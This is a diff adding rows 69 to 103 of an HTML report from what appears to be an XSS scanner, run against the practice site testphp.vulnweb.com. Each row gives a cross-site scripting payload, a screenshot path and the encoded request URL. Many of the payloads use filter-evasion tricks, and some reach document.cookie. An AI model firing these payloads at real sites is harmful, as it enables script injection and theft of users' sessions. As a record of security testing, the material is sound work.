+                <tr class='report-row'>
+                    <td>69</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_59_105.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.htm</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.htm&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.htm&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>70</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_59_121.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&amp;#x3E;&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%26%23x3E%3b%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%26%23x3E%3b%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>71</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_0_169.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x\%28\%29\ onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx%5c%2528%5c%2529%5c+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx%5c%2528%5c%2529%5c+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>72</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_0_580.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svgonload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%0conload%0c%3d%0calert(1)%0c%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%0conload%0c%3d%0calert(1)%0c%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>73</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_1_227.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=confirm(&#39;x&#39;) />]</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dconfirm(%27x%27)+%2f%3e%5d&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dconfirm(%27x%27)+%2f%3e%5d&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>74</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_1_796.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&quot;>&lt;img src=y onerror=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%22%3e%3cimg+src%3dy+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%22%3e%3cimg+src%3dy+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>75</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_2_68.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>76</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_2_44.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;&quot;();&lt;test>&lt;iframe onload=&quot;window.alert(&#39;XSS_WAF_BYPASS&#39;)&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=1%27%22()%3b%3ctest%3e%3ciframe+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=1%27%22()%3b%3ctest%3e%3ciframe+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>77</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_2_334.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=&quot;js:abc=&#39;al&#39;+&#39;ert()&#39;;eval(abc)&quot; /></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3d%22js%3aabc%3d%27al%27%2b%27ert()%27%3beval(abc)%22+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3d%22js%3aabc%3d%27al%27%2b%27ert()%27%3beval(abc)%22+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>78</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_2_827.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body onload=alert(/XSS/.source)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3dalert(%2fXSS%2f.source)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3dalert(%2fXSS%2f.source)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>79</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_3_676.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script ~~~>alert(0%0)&lt;/script ~~~></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+%7e%7e%7e%3ealert(0%250)%3c%2fscript+%7e%7e%7e%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+%7e%7e%7e%3ealert(0%250)%3c%2fscript+%7e%7e%7e%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>80</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_4_46.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=1 href=1 onerror=&quot;javascript:alert(&#39;HEJAP ZAIRY AL-SHARIF&#39;)&quot;>&lt;/img></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+href%3d1+onerror%3d%22javascript%3aalert(%27HEJAP+ZAIRY+AL-SHARIF%27)%22%3e%3c%2fimg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+href%3d1+onerror%3d%22javascript%3aalert(%27HEJAP+ZAIRY+AL-SHARIF%27)%22%3e%3c%2fimg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>81</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_4_695.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;>&lt;/img></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cIMG+SRC%3d%2f+onerror%3d%22alert(String.fromCharCode(88%2c83%2c83))%22%3e%3c%2fimg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cIMG+SRC%3d%2f+onerror%3d%22alert(String.fromCharCode(88%2c83%2c83))%22%3e%3c%2fimg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>82</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_4_840.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(1)&lt;/script>.html</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>83</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_4_927.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>/cpanelwebcall/&lt;img src=x onerror=&quot;prompt(1)&quot;>aaaaaaaaaaaa</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2fcpanelwebcall%2f%3cimg+src%3dx+onerror%3d%22prompt(1)%22%3eaaaaaaaaaaaa&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2fcpanelwebcall%2f%3cimg+src%3dx+onerror%3d%22prompt(1)%22%3eaaaaaaaaaaaa&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>84</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_4_970.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=a onerror=&quot;window[&#39;alert&#39;](document.cookie)&quot;/></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3da+onerror%3d%22window%5b%27alert%27%5d(document.cookie)%22%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3da+onerror%3d%22window%5b%27alert%27%5d(document.cookie)%22%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>85</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_189.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+alt%3dal+lang%3dert+onerror%3dtop%5balt%2blang%5d(0)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+alt%3dal+lang%3dert+onerror%3dtop%5balt%2blang%5d(0)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>86</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_306.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>&lt;/object></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cobject+data%3ddata%3atext%2fhtml%3bbase64%2cPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2b%3e%3c%2fobject%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cobject+data%3ddata%3atext%2fhtml%3bbase64%2cPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2b%3e%3c%2fobject%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>87</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_352.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(String.fromCharCode(66%2c+108%2c+65%2c+99%2c+75%2c+73%2c+99%2c+101))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(String.fromCharCode(66%2c+108%2c+65%2c+99%2c+75%2c+73%2c+99%2c+101))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>88</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_560.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)>&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fsrc%3d%22data%3atext%2fhtml%2c%3csvg+onload%3dalert(1)%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fsrc%3d%22data%3atext%2fhtml%2c%3csvg+onload%3dalert(1)%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>89</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_664.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=alert(123) /></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(123)+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(123)+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>90</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_5_944.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;image/src/onerror=prompt(8)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimage%2fsrc%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimage%2fsrc%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>91</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_6_962.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg>&lt;script>&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/script>&lt;/svg></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3e%26%23x61%3b%26%23x6C%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b%3c%2fscript%3e%3c%2fsvg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3e%26%23x61%3b%26%23x6C%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b%3c%2fscript%3e%3c%2fsvg%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>92</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_7_212.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3clink+rel%3d%22stylesheet%22+href%3d%22style.css%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3clink+rel%3d%22stylesheet%22+href%3d%22style.css%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>93</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_7_317.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.html</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>94</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_7_597.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&#39;>&quot;>&lt;script>alert();&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3e%27%3e%22%3e%3cscript%3ealert()%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3e%27%3e%22%3e%3cscript%3ealert()%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>95</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_7_768.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=alert(1)//</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(1)%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(1)%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>96</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_7_743.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&amp; apos;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%26+apos%3b%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%26+apos%3b%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>97</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_10.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x:alert(alt) onerror=eval(src) alt=0></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3d0%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3d0%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>98</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_81.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;input autofocus onfocus=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cinput+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cinput+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>99</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_276.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IFRAME SRC=&quot;javascript:alert(document.cookie);&quot;>&lt;/iframe>&#39;</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3aalert(document.cookie)%3b%22%3e%3c%2fiframe%3e%27&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3aalert(document.cookie)%3b%22%3e%3c%2fiframe%3e%27&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>100</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_432.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2520%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2520%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>101</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_704.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert([&#39;X&#39;,&#39;S&#39;,&#39;S&#39;].join(&#39;&#39;))&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%5b%27X%27%2c%27S%27%2c%27S%27%5d.join(%27%27))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%5b%27X%27%2c%27S%27%2c%27S%27%5d.join(%27%27))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>102</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_8_994.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script src=&quot;data:text/javascript,alert(1)&quot;>&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+src%3d%22data%3atext%2fjavascript%2calert(1)%22%3e%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+src%3d%22data%3atext%2fjavascript%2calert(1)%22%3e%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>103</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_9_575.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;&lt;SCRIPT>alert(&quot;test&quot;);//&lt;&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%3cSCRIPT%3ealert(%22test%22)%3b%2f%2f%3c%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%3cSCRIPT%3ealert(%22test%22)%3b%2f%2f%3c%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
